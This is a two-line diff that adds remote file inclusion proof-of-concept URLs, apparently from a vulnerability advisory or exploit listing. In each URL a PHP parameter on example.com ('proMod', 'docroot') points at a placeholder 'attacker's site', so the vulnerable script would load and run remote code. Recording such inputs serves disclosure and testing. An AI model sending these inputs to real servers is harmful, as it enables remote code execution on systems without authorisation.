@@ -1,0 +1,2 @@
+http://www.example.com/index.php?proMod=http://attacker's site
+http://www.example.com/mainpage.php?docroot=http://attacker's site
